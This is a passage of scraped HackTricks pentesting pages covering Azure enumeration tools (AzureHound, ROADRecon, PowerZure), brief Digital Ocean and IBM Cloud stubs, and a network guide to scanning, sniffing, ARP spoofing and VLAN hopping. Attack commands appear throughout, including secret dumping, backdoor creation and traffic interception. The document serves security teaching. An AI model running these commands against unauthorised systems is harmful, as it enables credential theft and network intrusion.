users\nGet-AzRoleAssignment\n-\nSignInName test@corp\n.\nonmicrosoft\n.\ncom\n# For current user\nOone of the most important commands to enumerate Azure is\nGet-AzResource\nfrom Az PowerShell as it lets you\nknow the resources your current user has visibility over\n.\nYou can get the same info in the\nweb console\ngoing to\nhttps://portal.azure.com/#view/HubsExtension/BrowseAll\nor searching for \"All resources\"\nAzureAD Enumeration\nBy default, any user should have\nenough permissions to enumerate\nthings such us, users, groups, roles, service principals... (check\ndefault AzureAD permissions\n).\nYou can find here a guide:\nAz - AzureAD\nNow that you\nhave some information about your credentials\n(and if you are a red team hopefully you\nhaven't been detected\n). It's time to figure out which services are being used in the environment.\nIn the following section you can check some ways to\nenumerate some common services.\nService Principal and Access Policy\nAn Azure service can have a System Identity (of the service itself) or use a User Assigned Managed Identity. This Identity can have Access Policy to, for example, a KeyVault to read secrets. These Access Policies should be restricted (least privilege principle), but might have more permissions than required. Typically an App Service would use KeyVault to retrieve secrets and certificates.\nSo it is useful to explore these identities.\nApp Service SCM\nKudu console to log in to the App Service 'container'.\nWebshell\nUse portal.azure.com and select the shell, or use shell.azure.com, for a bash or powershell. The 'disk' of this shell are stored as an image file in a storage-account.\nAzure DevOps\nAzure DevOps is separate from Azure. It has repositories, pipelines (yaml or release), boards, wiki, and more. Variable Groups are used to store variable values and secrets.\nAutomated Recon Tools\n​\nROADRecon\n​\ncd ROADTools\npipenv shell\nroadrecon auth\n-\nu test@corp\n.\nonmicrosoft\n.\ncom\n-\np\n\"Welcome2022!\"\nroadrecon gather\nroadrecon gui\n​\nMonkey365\n​\nImport-Module\nmonkey365\nGet-Help\nInvoke-Monkey365\nGet-Help\nInvoke-Monkey365\n-\nDetailed\nInvoke-Monkey365\n-\nIncludeAzureActiveDirectory\n-\nExportTo HTML\n-\nVerbose\n-\nDebug\n-\nInformationAction\nContinue\nInvoke-Monkey365\n-\nInstance Azure\n-\nAnalysis All\n-\nExportTo HTML\n​\nStormspotter\n​\n# Start Backend\ncd stormspotter\\backend\\\npipenv shell\npython ssbackend\n.\npyz\n​\n# Start Front-end\ncd stormspotter\\frontend\\dist\\spa\\\nquasar\n.\ncmd serve\n-\np 9091\n--\nhistory\n​\n# Run Stormcollector\ncd stormspotter\\stormcollector\\\npipenv shell\naz login\n-\nu test@corp\n.\nonmicrosoft\n.\ncom\n-\np Welcome2022!\npython stormspotter\\stormcollector\\sscollector\n.\npyz\ncli\n# This will generate a .zip file to upload in the frontend (127.0.0.1:9091)\n​\nAzureHound\n​\n# You need to use the Az PowerShell and Azure AD modules:\n$passwd\n=\nConvertTo-SecureString\n\"Welcome2022!\"\n-\nAsPlainText\n-\nForce\n$creds\n=\nNew-Object\nSystem\n.\nManagement\n.\nAutomation\n.\nPSCredential\n(\n\"\n[email protected]\n\"\n,\n$passwd\n)\nConnect-AzAccount\n-\nCredential\n$creds\n​\nImport-Module\nAzureAD\\AzureAD\n.\npsd1\nConnect-AzureAD\n-\nCredential\n$creds\n​\n# Launch AzureHound\n.\nAzureHound\\AzureHound\n.\nps1\nInvoke-AzureHound\n-\nVerbose\n​\n# Simple queries\n## All Azure Users\nMATCH\n(\nn:AZUser\n)\nreturn\nn\n.\nname\n## All Azure Applications\nMATCH\n(\nn:AZApp\n)\nreturn\nn\n.\nobjectid\n## All Azure Devices\nMATCH\n(\nn:AZDevice\n)\nreturn\nn\n.\nname\n## All Azure Groups\nMATCH\n(\nn:AZGroup\n)\nreturn\nn\n.\nname\n## All Azure Key Vaults\nMATCH\n(\nn:AZKeyVault\n)\nreturn\nn\n.\nname\n## All Azure Resource Groups\nMATCH\n(\nn:AZResourceGroup\n)\nreturn\nn\n.\nname\n## All Azure Service Principals\nMATCH\n(\nn:AZServicePrincipal\n)\nreturn\nn\n.\nobjectid\n## All Azure Virtual Machines\nMATCH\n(\nn:AZVM\n)\nreturn\nn\n.\nname\n## All Principals with the ‘Contributor’ role\nMATCH p =\n(\nn\n)\n-\n[r:AZContributor]\n-\n>\n(\ng\n)\nRETURN\np\n​\n# Advanced queries\n## Get Global Admins\nMATCH p =\n(\nn\n)\n-\n[r:AZGlobalAdmin*1..]\n-\n>\n(\nm\n)\nRETURN\np\n## Owners of Azure Groups\nMATCH p =\n(\nn\n)\n-\n[r:AZOwns]\n-\n>\n(\ng:AZGroup\n)\nRETURN\np\n## All Azure Users and their Groups\nMATCH p=\n(\nm:AZUser\n)\n-\n[r:MemberOf]\n-\n>\n(\nn\n)\nWHERE NOT m\n.\nobjectid CONTAINS\n'S-1-5'\nRETURN\np\n## Privileged Service Principals\nMATCH p =\n(\ng:AZServicePrincipal\n)\n-\n[r]\n-\n>\n(\nn\n)\nRETURN\np\n## Owners of Azure Applications\nMATCH p =\n(\nn\n)\n-\n[r:AZOwns]\n-\n>\n(\ng:AZApp\n)\nRETURN\np\n## Paths to VMs\nMATCH p =\n(\nn\n)\n-\n[r]\n-\n>\n(\ng: AZVM\n)\nRETURN\np\n## Paths to KeyVault\nMATCH p =\n(\nn\n)\n-\n[r]\n-\n>\n(\ng:AZKeyVault\n)\nRETURN\np\n## Paths to Azure Resource Group\nMATCH p =\n(\nn\n)\n-\n[r]\n-\n>\n(\ng:AZResourceGroup\n)\nRETURN\np\n## On-Prem users with edges to Azure\nMATCH  p=\n(\nm:User\n)\n-\n[r:AZResetPassword|AZOwns|AZUserAccessAdministrator|AZContributor|AZAddMembers|AZGlobalAdmin|AZVMContributor|AZOwnsAZAvereContributor]\n-\n>\n(\nn\n)\nWHERE m\n.\nobjectid CONTAINS\n'S-1-5-21'\nRETURN\np\n## All Azure AD Groups that are synchronized with On-Premise AD\nMATCH\n(\nn:\nGroup\n)\nWHERE n\n.\nobjectid CONTAINS\n'S-1-5'\nAND n\n.\nazsyncid IS NOT NULL\nRETURN\nn\n​\nAzucar\n​\n# You should use an account with at least read-permission on the assets you want to access\ngit\nclone https://github.com/nccgroup/azucar.git\nPS\n>\nGet-ChildItem\n-Recurse\nc:\n\\\nAzucar_V10\n|\nUnblock-File\n​\nPS\n>\n.\n\\\nAzucar.ps1\n-AuthMode\nUseCachedCredentials\n-Verbose\n-WriteLog\n-Debug\n-ExportTo\nPRINT\nPS\n>\n.\n\\\nAzucar.ps1\n-ExportTo\nCSV,JSON,XML,EXCEL\n-AuthMode\nCertificate_Credentials\n-Certificate\nC:\n\\\nAzucarTest\n\\\nserver.pfx\n-ApplicationId\n00000000-0000-0000-0000-000000000000\n-TenantID\n00000000-0000-0000-0000-000000000000\nPS\n>\n.\n\\\nAzucar.ps1\n-ExportTo\nCSV,JSON,XML,EXCEL\n-AuthMode\nCertificate_Credentials\n-Certificate\nC:\n\\\nAzucarTest\n\\\nserver.pfx\n-CertFilePassword\nMySuperP@ssw0rd\n!\n-ApplicationId\n00000000-0000-0000-0000-000000000000\n-TenantID\n00000000-0000-0000-0000-000000000000\n​\n# resolve the TenantID for an specific username\nPS\n>\n.\n\\\nAzucar.ps1\n-ResolveTenantUserName\n[email protected]\n​\nMicroBurst\n​\nImport-Module .\\MicroBurst.psm1\nImport-Module .\\Get-AzureDomainInfo.ps1\nGet-AzureDomainInfo -folder MicroBurst -Verbose\n​\nPowerZure\n​\nConnect-AzAccount\nipmo C:\\Path\\To\\Powerzure\n.\npsd1\nGet-AzureTarget\n​\n# Reader\n$\nGet-Runbook\n,\nGet-AllUsers\n,\nGet-Apps\n,\nGet-Resources\n,\nGet-WebApps\n,\nGet-WebAppDetails\n​\n# Contributor\n$ Execute-Command\n-\nOS Windows\n-\nVM Win10Test\n-\nResourceGroup\nTest-RG\n-\nCommand\n\"whoami\"\n$ Execute-MSBuild\n-\nVM Win10Test\n-\nResourceGroup\nTest-RG\n-\nFile\n\"build.xml\"\n$\nGet-AllSecrets\n# AllAppSecrets, AllKeyVaultContents\n$\nGet-AvailableVMDisks\n,\nGet-VMDisk\n# Download a virtual machine's disk\n​\n# Owner\n$\nSet-Role\n-\nRole Contributor\n-\nUser test@contoso\n.\ncom\n-\nResource Win10VMTest\n​\n# Administrator\n$ Create-Backdoor\n,\nExecute-Backdoor\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nAWS - S3 Unauthenticated Enum\nNext\nAz - Basic Information\nLast modified\n6mo ago"
    },
    {
        "title": "Digital Ocean Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/digital-ocean-pentesting",
        "text": "Digital Ocean Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nBefore start pentesting\na Digital Ocean environment there are a few\nbasics things you need to know\nabout how DO works to help you understand what you need to do, how to find misconfigurations and how to exploit them.\nConcepts such as hierarchy, access and other basic concepts are explained in:\nDO - Basic Information\nBasic Enumeration\nSSRF\nCloud SSRF\nHackTricks\nProjects\nTo get a list of the projects and resources running on each of them from the CLI check:\nDO - Projects\nWhoami\ndoctl account get\nServices Enumeration\nDO - Services\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nAz - Dynamic Groups Privesc\nNext\nDO - Basic Information\nLast modified\n11mo ago"
    },
    {
        "title": "IBM Cloud Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/ibm-cloud-pentesting",
        "text": "IBM Cloud Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWhat is IBM cloud? (By chatGPT)\nIBM Cloud is a cloud computing platform offered by IBM that provides a suite of cloud services, including infrastructure as a service (IaaS), platform as a service (PaaS), and software as a service (SaaS). It provides customers with the ability to deploy and manage applications, store and analyze data, and run virtual machines on the cloud.\nIn comparison to Amazon Web Services (AWS), IBM Cloud provides a similar range of services, but has some differences in terms of offerings and approach. Here are some key differences between IBM Cloud and AWS:\n1.\nFocus\n: AWS has a broad range of cloud services, whereas IBM Cloud has a stronger focus on enterprise clients and provides a suite of services tailored for their needs, including security and compliance.\n2.\nHybrid Cloud\n: IBM Cloud provides a hybrid cloud offering, allowing customers to run applications on both their own on-premises infrastructure and on the IBM Cloud. AWS also provides hybrid cloud solutions, but with a different approach and set of services.\n3.\nArtificial Intelligence and Machine Learning\n: IBM Cloud has a strong focus on artificial intelligence (AI) and machine learning (ML), offering a suite of services in these areas. AWS also provides services in AI and ML, but IBM's offerings are more extensive and integrated with its cloud platform.\n4.\nIndustries\n: IBM Cloud has a strong focus on specific industries, including financial services, healthcare, and government, and provides solutions tailored to their needs. AWS provides solutions across a wide range of industries, but may not have the same level of industry-specific offerings as IBM Cloud.\nBasic Information\nFor some basic information about IAM and hierarchi check:\nIBM - Basic Information\nSSRF\nLearn how you can access the medata endpoint of IBM in the following page:\nCloud SSRF\nHackTricks\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nDO - Volumes\nNext\nIBM - Hyper Protect Crypto Services\nLast modified\n5mo ago"
    },
    {
        "title": "HackTricks Pentesting Network",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network",
        "text": "Pentesting Network\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n​\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nDiscovering hosts from the outside\nThis is going to be a\nbrief section\nabout how to find\nIPs responding\nfrom the\nInternet\n.\nIn this situation you have some\nscope of IPs\n(maybe even several\nranges\n) and you just to find\nwhich IPs are responding\n.\nICMP\nThis is the\neasiest\nand\nfastest\nway to discover if a host is up or not.\nYou could try to send some\nICMP\npackets and\nexpect responses\n. The easiest way is just sending an\necho request\nand expect from the response. You can do that using a simple\nping\nor using\nfping\nfor\nranges\n.\nYou could also use\nnmap\nto send other types of ICMP packets (this will avoid filters to common ICMP echo request-response).\nping\n-c\n1\n199.66\n.11.4\n# 1 echo request to a host\nfping\n-g\n199.66\n.11.0/24\n# Send echo requests to ranges\nnmap\n-PE\n-PM\n-PP\n-sn\n-n\n199.66\n.11.0/24\n#Send echo, timestamp requests and subnet mask requests\nTCP Port Discovery\nIt's very common to find that all kind of ICMP packets are being filtered. Then, all you can do to check if a host is up is\ntry to find open ports\n. Each host has\n65535 ports\n, so, if you have a \"big\" scope you\ncannot\ntest if\neach port\nof each host is open or not, that will take too much time.\nThen, what you need is a\nfast port scanner\n(\nmasscan\n) and a list of the\nports more used:\n#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)\nmasscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080\n199.66\n.11.0/24\nYou could also perform this step with\nnmap\n, but it slower and somewhat\nnmap\nhas problems identifying hosts up.\nHTTP Port Discovery\nThis is just a TCP port discovery useful when you want to\nfocus on discovering HTTP\nservices\n:\nmasscan -p80,443,8000-8100,8443\n199.66\n.11.0/24\nUDP Port Discovery\nYou could also try to check for some\nUDP port open\nto decide if you should\npay more attention\nto a\nhost.\nAs UDP services usually\ndon't respond\nwith\nany data\nto a regular empty UDP probe packet it is difficult to say if a port is being filtered or open. The easiest way to decide this is to send a packet related to the running service, and as you don't know which service is running, you should try the most probable based on the port number:\nnmap\n-sU\n-sV\n--version-intensity\n0\n-F\n-n\n199.66\n.11.53/24\n# The -sV will make nmap test each possible known UDP service packet\n# The \"--version-intensity 0\" will make nmap only test the most probable\nThe nmap line proposed before will test the\ntop 1000 UDP ports\nin every host inside the\n/24\nrange but even only this will take\n>20min\n. If need\nfastest results\nyou can use\nudp-proto-scanner\n:\n./udp-proto-scanner.pl 199.66.11.53/24\nThis will send these\nUDP probes\nto their\nexpected port\n(for a /24 range this will just take 1 min):\nDNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp.\nSCTP Port Discovery\n#Probably useless, but it's pretty fast, why not trying?\nnmap\n-T4\n-sY\n-n\n--open\n-Pn\n<\nIP/range\n>\nPentesting Wifi\nHere you can find a nice guide of all the well known Wifi attacks at the time of the writing:\nPentesting Wifi\nDiscovering hosts from the inside\nIf you are inside the network one of the first things you will want to do is to\ndiscover other hosts\n. Depending on\nhow much noise\nyou can/want to do, different actions could be performed:\nPassive\nYou can use these tools to passively discover hosts inside a connected network:\nnetdiscover\n-p\np0f\n-i\neth0\n-p\n-o\n/tmp/p0f.log\n# Bettercap\nnet.recon on/off\n#Read local ARP cache periodically\nnet.show\nset\nnet.show.meta\ntrue\n#more info\nActive\nNote that the techniques commented in\nDiscovering hosts from the outside\n(\nTCP/HTTP/UDP/SCTP Port Discovery\n) can be also\napplied here\n.\nBut, as you are in the\nsame network\nas the other hosts, you can do\nmore things\n:\n#ARP discovery\nnmap\n-sn\n<\nNetwork\n>\n#ARP Requests (Discover IPs)\nnetdiscover\n-r\n<\nNetwork\n>\n#ARP requests (Discover IPs)\n​\n#NBT discovery\nnbtscan\n-r\n192.168\n.0.1/24\n#Search in Domain\n​\n# Bettercap\nnet.probe on/off\n#Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD\nset\nnet.probe.mdns true/false\n#Enable mDNS discovery probes (default=true)\nset\nnet.probe.nbns true/false\n#Enable NetBIOS name service discovery probes (default=true)\nset\nnet.probe.upnp true/false\n#Enable UPNP discovery probes (default=true)\nset\nnet.probe.wsd true/false\n#Enable WSD discovery probes (default=true)\nset\nnet.probe.throttle\n10\n#10ms between probes sent (default=10)\n​\n#IPv6\nalive6\n<\nIFACE\n>\n# Send a pingv6 to multicast.\nActive ICMP\nNote that the techniques commented in\nDiscovering hosts from the outside\n(\nICMP\n) can be also\napplied here\n.\nBut, as you are in the\nsame network\nas the other hosts, you can do\nmore things\n:\nIf you\nping\na\nsubnet broadcast address\nthe ping should be arrive to\neach host\nand they could\nrespond\nto\nyou\n:\nping -b 10.10.5.255\nPinging the\nnetwork broadcast address\nyou could even find hosts inside\nother subnets\n:\nping -b 255.255.255.255\nUse the\n-PE\n,\n-PP\n,\n-PM\nflags of\nnmap\nto perform host discovery sending respectively\nICMPv4 echo\n,\ntimestamp\n, and\nsubnet mask requests:\nnmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24\nWake On Lan\nWake On Lan is used to\nturn on\ncomputers through a\nnetwork message\n. The magic packet used to turn on the computer is only a packet where a\nMAC Dst\nis provided and then it is\nrepeated 16 times\ninside the same paket.\nThen this kind of packets are usually sent in an\nethernet 0x0842\nor in a\nUDP packet to port 9\n.\nIf\nno [MAC]\nis provided, the packet is sent to\nbroadcast ethernet\n(and the broadcast MAC will be the one being repeated).\n# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)\nwol.eth\n[\nMAC\n]\n#Send a WOL as a raw ethernet packet of type 0x0847\nwol.udp\n[\nMAC\n]\n#Send a WOL as an IPv4 broadcast packet to UDP port 9\nScanning Hosts\nOnce you have discovered all the IPs (external or internal) you want to scan in depth, different actions can be performed.\nTCP\nOpen\nport:\nSYN --> SYN/ACK --> RST\nClosed\nport:\nSYN --> RST/ACK\nFiltered\nport:\nSYN --> [NO RESPONSE]\nFiltered\nport:\nSYN --> ICMP message\n# Nmap fast scan for the most 1000tcp ports used\nnmap\n-sV\n-sC\n-O\n-T4\n-n\n-Pn\n-oA\nfastscan\n<\nIP\n>\n# Nmap fast scan for all the ports\nnmap\n-sV\n-sC\n-O\n-T4\n-n\n-Pn\n-p-\n-oA\nfullfastscan\n<\nIP\n>\n# Nmap fast scan for all the ports slower to avoid failures due to -T4\nnmap\n-sV\n-sC\n-O\n-p-\n-n\n-Pn\n-oA\nfullscan\n<\nIP\n>\n​\n#Bettercap Scan\nsyn.scan\n192.168\n.1.0/24\n1\n10000\n#Ports 1-10000\nUDP\nThere are 2 options to scan an UDP port:\nSend a\nUDP packet\nand check for the response\nICMP unreachable\nif the port is\nclosed\n(in several cases ICMP will be\nfiltered\nso you won't receive any information inf the port is close or open).\nSend a\nformatted datagrams\nto elicit a response from a\nservice\n(e.g., DNS, DHCP, TFTP, and others, as listed in\nnmap-payloads\n). If you receive a\nresponse\n, then, the port is\nopen\n.\nNmap\nwill\nmix both\noptions using \"-sV\" (UDP scans are very slow), but notice that UDP scans are slower than TCP scans:\n# Check if any of the most common udp services is running\nudp-proto-scanner.pl\n<\nIP\n>\n# Nmap fast check if any of the 100 most common UDP services is running\nnmap\n-sU\n-sV\n--version-intensity\n0\n-n\n-F\n-T4\n<\nIP\n>\n# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts\nnmap\n-sU\n-sV\n-sC\n-n\n-F\n-T4\n<\nIP\n>\n# Nmap \"fast\" top 1000 UDP ports\nnmap\n-sU\n-sV\n--version-intensity\n0\n-n\n-T4\n<\nIP\n>\n# You could use nmap to test all the UDP ports, but that will take a lot of time\nSCTP Scan\nSCTP sits alongside TCP and UDP. Intended to provide\ntransport\nof\ntelephony\ndata over\nIP\n, the protocol duplicates many of the reliability features of Signaling System 7 (SS7), and underpins a larger protocol family known as SIGTRAN. SCTP is supported by operating systems including IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, and VxWorks.\nTwo different scans for SCTP are offered by nmap:\n-sY\nand\n-sZ\n# Nmap fast SCTP scan\nnmap\n-T4\n-sY\n-n\n-oA\nSCTFastScan\n<\nIP\n>\n# Nmap all SCTP scan\nnmap\n-T4\n-p-\n-sY\n-sV\n-sC\n-F\n-n\n-oA\nSCTAllScan\n<\nIP\n>\nIDS and IPS evasion\nIDS and IPS Evasion\nMore nmap options\nNmap Summary (ESP)\nRevealing Internal IP Addresses\nMisconfigured routers, firewalls, and network devices sometimes\nrespond\nto network probes\nusing nonpublic source addresses\n. You can use\ntcpdump\nused to\nidentify packets\nreceived from\nprivate addresses\nduring testing. In this case, the\neth2\ninterface in Kali Linux is\naddressable\nfrom the\npublic Internet\n(If you are\nbehind\na\nNAT\nof a\nFirewall\nthis kind of packets are probably going to be\nfiltered\n).\ntcpdump –nt\n-i\neth2 src net\n10\nor\n172.16\n/12 or\n192.168\n/16\ntcpdump: verbose output suppressed, use\n-v\nor\n-vv\nfor\nfull protocol decode\nlistening on eth2, link-type EN10MB\n(\nEthernet\n)\n, capture size\n65535\nbytes\nIP\n10.10\n.0.1\n>\n185.22\n.224.18: ICMP\necho\nreply,\nid\n25804\n,\nseq\n1582\n, length\n64\nIP\n10.10\n.0.2\n>\n185.22\n.224.18: ICMP\necho\nreply,\nid\n25804\n,\nseq\n1586\n, length\n64\nSniffing\nSniffing you can learn details of IP ranges, subnet sizes, MAC addresses, and hostnames by reviewing captured frames and packets. If the network is misconfigured or switching fabric under stress, attackers can capture sensitive material via passive network sniffing.\nIf a switched Ethernet network is configured properly, you will only see broadcast frames and material destined for your MAC address.\nTCPDump\nsudo\ntcpdump\n-i\n<\nINTERFACE\n>\nudp port\n53\n#Listen to DNS request to discover what is searching the host\ntcpdump\n-i\n<\nIFACE\n>\nicmp\n#Listen to icmp packets\nsudo\nbash\n-c\n\"sudo nohup tcpdump -i eth0 -G 300 -w\n\\\"\n/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\n\\\"\n-W 50 'tcp and (port 80 or port 443)' &\"\nOne can, also, capture packets from a remote machine over an SSH session with Wireshark as the GUI in realtime.\nssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -\nssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic\nBettercap\nnet.sniff on\nnet.sniff stats\nset\nnet.sniff.output sniffed.pcap\n#Write captured packets to file\nset\nnet.sniff.local\n#If true it will consider packets from/to this computer, otherwise it will skip them (default=false)\nset\nnet.sniff.filter\n#BPF filter for the sniffer (default=not arp)\nset\nnet.sniff.regexp\n#If set only packets matching this regex will be considered\nWireshark\nObviously.\nCapturing credentials\nYou can use tools like\nhttps://github.com/lgandx/PCredz\nto parse credentials from a pcap or a live interface.\nLAN attacks\nARP spoofing\nARP Spoofing consist on sending gratuitous ARPResponses to indicate that the IP of a machine has the MAC of our device. Then, the victim will change the ARP table and will contact our machine every time it wants to contact the IP spoofed.\nBettercap\narp.spoof on\nset\narp.spoof.targets\n<\nIP\n>\n#Specific targets to ARP spoof (default=<entire subnet>)\nset\narp.spoof.whitelist\n#Specific targets to skip while spoofing\nset\narp.spoof.fullduplex\ntrue\n#If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)\nset\narp.spoof.internal\ntrue\n#If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)\nArpspoof\necho\n1\n>\n/proc/sys/net/ipv4/ip_forward\narpspoof\n-t\n192.168\n.1.1\n192.168\n.1.2\narpspoof\n-t\n192.168\n.1.2\n192.168\n.1.1\nMAC Flooding - CAM overflow\nOverflow the switch’s CAM table sending a lot of packets with different source mac address. When the CAM table is full the switch start behaving like a hub (broadcasting all the traffic).\nmacof\n-i\n<\ninterface\n>\nIn modern switches this vulnerability has been fixed.\n802.1Q VLAN / DTP Attacks\nDynamic Trunking\nDTP (Dynamic Trunking Protocol)\nis a link layer protocol designed to provide an automatic trunking system. With DTP, switches decide which port will work in trunk mode (Trunk) and which will not. The use of\nDTP\nindicates\npoor network design.\nTrunks should be strictly\nwhere they are needed, and it should be documented.\nBy default, all switch ports operate in Dynamic Auto mode.\nThis indicates that the switch port is in trunk initiation mode from the neighbouring switch.\nThe Pentester needs to physically connect to the switch and send a DTP Desirable frame\n, which triggers the port to switch to trunk mode. The attacker can then enumerate VLANs using STP frame analysis and bypass VLAN segmentation by creating virtual interfaces.\nMany switches support the Dynamic Trunking Protocol (DTP) by default, however, which an adversary can abuse to\nemulate a switch and receive traffic across all VLANs\n. The tool\ndtpscan.sh\ncan sniff an interface and\nreports if switch is in Default mode, trunk, dynamic, auto or access mode\n(this is the only one that would avoid VLAN hopping). The tool will indicate if the switch is vulnerable or not.\nIf it was discovered that the the network is vulnerable, you can use\nYersinia\nto launch an \"\nenable trunking\n\" using protocol \"\nDTP\n\" and you will be able to see network packets from all the VLANs.\napt-get\ninstall\nyersinia\n#Installation\nsudo\napt\ninstall\nkali-linux-large\n#Another way to install it in Kali\nyersinia\n-I\n#Interactive mode\n#In interactive mode you will need to select a interface first\n#Then, you can select the protocol to attack using letter \"g\"\n#Finally, you can select the attack using letter \"x\"\n​\nyersinia\n-G\n#For graphic mode\nTo enumerate the VLANs it's also possible to generate the DTP Desirable frame with the script\nDTPHijacking.py\n. D\no not interrupt the script under any circumstances. It injects DTP Desirable every three seconds.\nThe dynamically created trunk channels on the switch only live for five minutes. After five minutes, the trunk falls off.\nsudo python3 DTPHijacking.py --interface eth0\nI would like to point out that\nAccess/Desirable (0x03)\nindicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And\n802.1Q/802.1Q (0xa5\n) indicates the\n802.1Q\nencapsulation type.\nBy analyzing the STP frames,\nwe learn about the existence of VLAN 30 and VLAN 60.\nAttacking specific VLANs\nOnce you known VLAN IDs and IPs values, you can\nconfigure a virtual interface to attack a specific VLAN\n.\nIf DHCP is not available, then use\nifconfig\nto set a static IP address.\nroot@kali:~# modprobe 8021q\nroot@kali:~# vconfig add eth1 250\nAdded VLAN with VID == 250 to IF -:eth1:-\nroot@kali:~# dhclient eth1.250\nReloading /etc/samba/smb.conf: smbd only.\nroot@kali:~# ifconfig eth1.250\neth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65\ninet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0\ninet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:19 errors:0 dropped:0 overruns:0 frame:0\nTX packets:13 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:0\nRX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)\n​\nroot@kali:~# arp-scan -I eth1.250 10.121.5.0/24\n# Another configuration example\nmodprobe 8021q\nvconfig\nadd\neth1\n20\nifconfig\neth1.20\n192.168\n.1.2 netmask\n255.255\n.255.0 up\n# Another configuration example\nsudo\nvconfig\nadd\neth0\n30\nsudo\nip\nlink\nset\neth0.30 up\nsudo\ndhclient\n-v\neth0.30\nAutomatic VLAN Hopper\nThe discussed attack of\nDynamic Trunking and creating virtual interfaces an discovering hosts inside\nother VLANs are\nautomatically performed\nby the tool:\nhttps://github.com/nccgroup/vlan-hopping---frogger\n​\nDouble Tagging\nIf an attacker knows the value of the\nMAC, IP and VLAN ID of the victim host\n, he could try to\ndouble tag a frame\nwith its 